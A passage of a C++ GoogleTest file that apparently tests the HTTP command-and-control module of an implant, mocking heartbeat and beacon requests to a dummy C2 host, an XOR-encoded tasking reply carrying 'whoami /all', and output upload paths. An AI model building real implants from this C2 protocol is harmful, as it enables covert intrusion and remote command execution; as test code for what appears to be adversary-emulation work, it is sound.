#include <gtest/gtest.h>
#include <gmock/gmock.h>
#include "comms_http.h"
#include "enc_handler.h"
#include "test_util.h"
#include <string>
#include <cstring>
#include <vector>

#define TEST_BEACON_PATH L"/PUB/MOCKIMPLANTID"
#define DUMMY_OUTPUT_FILE_PATH1 L"C:\\my\\dummy\\output\\file\\1234.log"
#define DUMMY_OUTPUT_FILE_PATH2 L"C:\\my\\dummy\\output\\file\\2345.log"
#define DUMMY_OUTPUT_FILE_NAME1 L"1234.log"
#define DUMMY_OUTPUT_FILE_NAME2 L"2345.log"
#define OUTPUT_FILE_SIZE1 5000
#define OUTPUT_FILE_SIZE2 3000
#define OUTPUT_FILE_POST_PATH1 L"/IMAGES/3/1234"
#define OUTPUT_FILE_POST_PATH2 L"/IMAGES/3/2345"
#define DUMMY_COMMAND_OUTPUT_LEN 28

using ::testing::_;
using ::testing::DoAll;
using ::testing::Invoke;
using ::testing::Return;
using ::testing::SaveArg;
using ::testing::SetArgPointee;
using ::testing::StrEq;
using ::testing::InSequence;

namespace fs = std::filesystem;

// Test fixture for shared data
class CommsHttpTest : public ::testing::Test {
protected:
    MockApiWrapper mock_api_wrapper;

    std::string mock_timestamp = "2000-12-01 12:34:56";
    HINTERNET mock_h_inet = HINTERNET(1234);
    HINTERNET mock_h_session = HINTERNET(2345);
    HINTERNET mock_h_request = HINTERNET(3456);
    DWORD dummy_error = 123;
    instruction::Instruction dummy_cmd_instruction;
    std::wstring dummy_cmd_id = L"123456789012345678";
    std::wstring dummy_cmd_command = L"whoami /all";
    static constexpr const char* dummy_beacon_response_cmd = "ID123456789012345678#01 &d2hvYW1pIC9hbGw=#5&&&";
    static constexpr const char encrypted_beacon_response_cmd[46] = {0x78,0x22,0x08,0x02,0x00,0x04,0x00,0x05,0x5d,0x54,0x5f,0x51,0x5b,0x41,0x58,0x58,0x5f,0x05,0x0e,0x08,0x12,0x09,0x01,0x11,0x15,0x11,0x46,0x58,0x4f,0x61,0x32,0x06,0x47,0x31,0x2b,0x55,0x09,0x08,0x2c,0x1b,0x4c,0x53,0x5a,0x5c,0x53,0x40};
    std::wstring dummy_payload_url = std::wstring(L"/IMAGES/3/") + dummy_cmd_id;
    std::wstring dummy_command_output_url = std::wstring(L"/IMAGES/3/") + dummy_cmd_id;
    HANDLE h_mock_output_file1 = HANDLE(10121);
    HANDLE h_mock_output_file2 = HANDLE(10122);
    char encrypted_file_contents[OUTPUT_FILE_SIZE1];
    std::vector<unsigned char> v_dummy_payload_contents;
    std::vector<unsigned char> v_xored_dummy_payload_contents;
    std::vector<char> v_dummy_command_output;
    const char* dummy_commmand_output = "this is dummy command output";
    char encrypted_dummy_command_output[DUMMY_COMMAND_OUTPUT_LEN] = {0x45,0x0e,0x50,0x43,0x13,0x59,0x46,0x13,0x0e,0x19,0x0b,0x0c,0x13,0x53,0x08,0x03,0x07,0x5e,0x58,0x5e,0x55,0x19,0x5f,0x44,0x47,0x05,0x01,0x44};
    size_t dummy_payload_size = RESP_BUFFER_SIZE*3;
    static constexpr const char mock_response_data[1] = {49}; // the "1" character
    std::wstring mock_implant_id = L"MOCKIMPLANTID";
    HANDLE h_dummy_mutex = HANDLE(8888);
    static constexpr const DWORD status_ok = HTTP_STATUS_OK;

    LPCWSTR dummy_c2_address = L"this.domain.does.not.exist";
    WORD dummy_c2_port = 100;

    LPCWSTR dummy_accept_types[2] = {L"*/*", NULL}; 

    void SetUp() override {
        dummy_cmd_instruction = instruction::Instruction();
        dummy_cmd_instruction.instruction_type = 1;
        dummy_cmd_instruction.sleep_time = 5;
        dummy_cmd_instruction.instruction_id = dummy_cmd_id;
        dummy_cmd_instruction.shell_command = dummy_cmd_command;

        std::memset(encrypted_file_contents, 65, OUTPUT_FILE_SIZE1);
        XorInPlace(encrypted_file_contents, OUTPUT_FILE_SIZE1);

        v_dummy_payload_contents.insert(v_dummy_payload_contents.end(), dummy_payload_size, 67);
        v_xored_dummy_payload_contents.insert(v_xored_dummy_payload_contents.end(), dummy_payload_size, 67);
        v_dummy_command_output.insert(v_dummy_command_output.end(), dummy_commmand_output, dummy_commmand_output + strlen(dummy_commmand_output));
        XorInPlace(&v_xored_dummy_payload_contents[0], dummy_payload_size);
    }
};

// Define our own matching logic to compare Instruction structs
MATCHER_P(InstructionEq, pTarget, "") {
    return (pTarget->instruction_type == arg->instruction_type) &&
        (pTarget->sleep_time == arg->sleep_time) &&
        (pTarget->instruction_id.compare(arg->instruction_id) == 0) &&
        (pTarget->shell_command.compare(arg->shell_command) == 0);
}

// Define our own matching logic to compare accept_types array for HTTP requests
MATCHER_P2(AcceptTypesEq, target_accept_types, length, "") { 
    for (int i = 0; i < length; i++) {
        if (target_accept_types[i] == NULL) {
            if (arg[i] == NULL) break;
            else return false;
        }
        if (wcscmp(target_accept_types[i], arg[i]) != 0) return false;
    }
    return true;
}

MATCHER_P2(BufferContentEq, target, length, "") {
    return (memcmp(arg, target, length) == 0);
}

TEST_F(CommsHttpTest, TestPerformHeartbeatSuccess) {
    LPVOID mock_buf;
    LPVOID status_buf;

	EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_session));

    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(
        mock_h_session,
        StrEq(L"GET"),
        StrEq(HEARTBEAT_PATH),
        NULL,
        NULL,
        AcceptTypesEq(dummy_accept_types, 2),
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_request));

    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(
        mock_h_request,
        NULL,
        -1L,
        NULL,
        0
    )).Times(1).WillOnce(Return(TRUE));

    EXPECT_CALL(mock_api_wrapper, HttpQueryInfoWrapper(
        mock_h_request,
        HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        _,
        _,
        NULL
    )).Times(1).WillOnce(DoAll(
        SaveArg<2>(&status_buf),
        Invoke([&status_buf]() { std::memcpy(status_buf, &status_ok, sizeof(DWORD)); }),
        SetArgPointee<3>(sizeof(DWORD)),
        Return(TRUE)
    ));

    EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper(
        mock_h_request,
        _,
        RESP_BUFFER_SIZE,
        _
    )).Times(2)
        .WillOnce(DoAll(
            SaveArg<1>(&mock_buf),
            Invoke([&mock_buf]() { std::memcpy(mock_buf, mock_response_data, 1); }),
            SetArgPointee<3>(1),
            Return(TRUE)))
        .WillOnce(DoAll(
            SetArgPointee<3>(0),
            Return(TRUE)));

    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_request))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_session))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_inet))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::PerformHeartbeat(&mock_api_wrapper, dummy_c2_address, dummy_c2_port), ERROR_SUCCESS);
}

TEST_F(CommsHttpTest, TestPerformHeartbeatFailReadResponse) {
    LPVOID status_buf;

	EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_session));

    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(
        mock_h_session,
        StrEq(L"GET"),
        StrEq(HEARTBEAT_PATH),
        NULL,
        NULL,
        AcceptTypesEq(dummy_accept_types, 2),
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_request));

    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(
        mock_h_request,
        NULL,
        -1L,
        NULL,
        0
    )).Times(1).WillOnce(Return(TRUE));

    EXPECT_CALL(mock_api_wrapper, HttpQueryInfoWrapper(
        mock_h_request,
        HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        _,
        _,
        NULL
    )).Times(1).WillOnce(DoAll(
        SaveArg<2>(&status_buf),
        Invoke([&status_buf]() { std::memcpy(status_buf, &status_ok, sizeof(DWORD)); }),
        SetArgPointee<3>(sizeof(DWORD)),
        Return(TRUE)
    ));

    EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper(
        mock_h_request,
        _,
        RESP_BUFFER_SIZE,
        _
    )).Times(1)
        .WillOnce(Return(FALSE));

    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_request))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_session))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_inet))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, GetLastErrorWrapper())
        .Times(1)
        .WillOnce(Return(dummy_error));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::PerformHeartbeat(&mock_api_wrapper, dummy_c2_address, dummy_c2_port), dummy_error);
}

TEST_F(CommsHttpTest, TestPerformHeartbeatFailSendRequest) {
	EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_session));

    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(
        mock_h_session,
        StrEq(L"GET"),
        StrEq(HEARTBEAT_PATH),
        NULL,
        NULL,
        AcceptTypesEq(dummy_accept_types, 2),
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_request));

    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(
        mock_h_request,
        NULL,
        -1L,
        NULL,
        0
    )).Times(1).WillOnce(Return(FALSE));

    EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper( _, _, _, _)).Times(0);

    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_request))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_session))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_inet))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, GetLastErrorWrapper())
        .Times(1)
        .WillOnce(Return(dummy_error));
    
    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::PerformHeartbeat(&mock_api_wrapper, dummy_c2_address, dummy_c2_port), dummy_error);
}

TEST_F(CommsHttpTest, TestPerformHeartbeatFailOpenRequest) {
	EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_session));

    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(
        mock_h_session,
        StrEq(L"GET"),
        StrEq(HEARTBEAT_PATH),
        NULL,
        NULL,
        AcceptTypesEq(dummy_accept_types, 2),
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(HINTERNET(NULL)));

    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(_, _, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper(_, _, _, _)).Times(0);

    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(_)).Times(0);
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_session))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_inet))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, GetLastErrorWrapper())
        .Times(1)
        .WillOnce(Return(dummy_error));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::PerformHeartbeat(&mock_api_wrapper, dummy_c2_address, dummy_c2_port), dummy_error);
}

TEST_F(CommsHttpTest, TestPerformHeartbeatFailInternetConnect) {
	EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(HINTERNET(NULL)));

    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(_, _, _, _, _, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(_, _, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper(_, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(_)).Times(0);
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_inet))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, GetLastErrorWrapper())
        .Times(1)
        .WillOnce(Return(dummy_error));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::PerformHeartbeat(&mock_api_wrapper, dummy_c2_address, dummy_c2_port), dummy_error);
}

TEST_F(CommsHttpTest, TestPerformHeartbeatFailInternetOpen) {
	EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(HINTERNET(NULL)));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(_, _, _, _, _, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(_, _, _, _, _, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(_, _, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper(_, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(_)).Times(0);
    EXPECT_CALL(mock_api_wrapper, GetLastErrorWrapper())
        .Times(1)
        .WillOnce(Return(dummy_error));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::PerformHeartbeat(&mock_api_wrapper, dummy_c2_address, dummy_c2_port), dummy_error);
}

TEST_F(CommsHttpTest, TestPerformBeaconSuccess) {
    LPVOID mock_buf;
    LPVOID status_buf;
    instruction::Instruction received_instruction = instruction::Instruction();
    
	EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_session));

    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(
        mock_h_session,
        StrEq(L"GET"),
        StrEq(TEST_BEACON_PATH),
        NULL,
        NULL,
        AcceptTypesEq(dummy_accept_types, 2),
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_request));

    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(
        mock_h_request,
        NULL,
        -1L,
        NULL,
        0
    )).Times(1).WillOnce(Return(TRUE));

    EXPECT_CALL(mock_api_wrapper, HttpQueryInfoWrapper(
        mock_h_request,
        HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        _,
        _,
        NULL
    )).Times(1).WillOnce(DoAll(
        SaveArg<2>(&status_buf),
        Invoke([&status_buf]() { std::memcpy(status_buf, &status_ok, sizeof(DWORD)); }),
        SetArgPointee<3>(sizeof(DWORD)),
        Return(TRUE)
    ));

    EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper(
        mock_h_request,
        _,
        RESP_BUFFER_SIZE,
        _
    )).Times(2)
        .WillOnce(DoAll(
            SaveArg<1>(&mock_buf),
            Invoke([&mock_buf]() { std::memcpy(mock_buf, encrypted_beacon_response_cmd, strlen(dummy_beacon_response_cmd)); }),
            SetArgPointee<3>(strlen(dummy_beacon_response_cmd)),
            Return(TRUE)))
        .WillOnce(DoAll(
            SetArgPointee<3>(0),
            Return(TRUE)));

    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_request))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_session))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_inet))
        .Times(1)
        .WillOnce(Return(TRUE));

    ASSERT_EQ(comms_http::PerformBeacon(&mock_api_wrapper, dummy_c2_address, dummy_c2_port, mock_implant_id, &received_instruction), ERROR_SUCCESS);
    EXPECT_THAT(&received_instruction, InstructionEq(&dummy_cmd_instruction));
}

TEST_F(CommsHttpTest, TestPerformBeaconFailReadResponse) {
    LPVOID status_buf;

	EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_session));

    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(
        mock_h_session,
        StrEq(L"GET"),
        StrEq(TEST_BEACON_PATH),
        NULL,
        NULL,
        AcceptTypesEq(dummy_accept_types, 2),
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_request));

    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(
        mock_h_request,
        NULL,
        -1L,
        NULL,
        0
    )).Times(1).WillOnce(Return(TRUE));

    EXPECT_CALL(mock_api_wrapper, HttpQueryInfoWrapper(
        mock_h_request,
        HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        _,
        _,
        NULL
    )).Times(1).WillOnce(DoAll(
        SaveArg<2>(&status_buf),
        Invoke([&status_buf]() { std::memcpy(status_buf, &status_ok, sizeof(DWORD)); }),
        SetArgPointee<3>(sizeof(DWORD)),
        Return(TRUE)
    ));

    EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper(
        mock_h_request,
        _,
        RESP_BUFFER_SIZE,
        _
    )).Times(1).WillOnce(Return(FALSE));

    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_request))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_session))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_inet))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, GetLastErrorWrapper())
        .Times(1)
        .WillOnce(Return(dummy_error));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::PerformBeacon(&mock_api_wrapper, dummy_c2_address, dummy_c2_port, mock_implant_id, NULL), dummy_error);
}

TEST_F(CommsHttpTest, TestPerformBeaconFailSendRequest) {
	EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_session));

    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(
        mock_h_session,
        StrEq(L"GET"),
        StrEq(TEST_BEACON_PATH),
        NULL,
        NULL,
        AcceptTypesEq(dummy_accept_types, 2),
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_request));

    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(
        mock_h_request,
        NULL,
        -1L,
        NULL,
        0
    )).Times(1).WillOnce(Return(FALSE));
    EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper( _, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_request))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_session))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_inet))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, GetLastErrorWrapper())
        .Times(1)
        .WillOnce(Return(dummy_error));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::PerformBeacon(&mock_api_wrapper, dummy_c2_address, dummy_c2_port, mock_implant_id, NULL), dummy_error);
}

TEST_F(CommsHttpTest, TestPerformBeaconFailOpenRequest) {
	EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_session));

    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(
        mock_h_session,
        StrEq(L"GET"),
        StrEq(TEST_BEACON_PATH),
        NULL,
        NULL,
        AcceptTypesEq(dummy_accept_types, 2),
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(HINTERNET(NULL)));

    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(_, _, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper(_, _, _, _)).Times(0);

    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(_)).Times(0);
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_session))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_inet))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, GetLastErrorWrapper())
        .Times(1)
        .WillOnce(Return(dummy_error));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::PerformBeacon(&mock_api_wrapper, dummy_c2_address, dummy_c2_port, mock_implant_id, NULL), dummy_error);
}

TEST_F(CommsHttpTest, TestPerformBeaconFailInternetConnect) {
	EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(HINTERNET(NULL)));

    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(_, _, _, _, _, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(_, _, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper(_, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(_)).Times(0);
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_inet))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, GetLastErrorWrapper())
        .Times(1)
        .WillOnce(Return(dummy_error));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::PerformBeacon(&mock_api_wrapper, dummy_c2_address, dummy_c2_port, mock_implant_id, NULL), dummy_error);
}

TEST_F(CommsHttpTest, TestPerformBeaconFailInternetOpen) {
	EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(HINTERNET(NULL)));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(_, _, _, _, _, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(_, _, _, _, _, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(_, _, _, _, _)).Times(0);
    EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper(_, _, _, _)).Times(0);
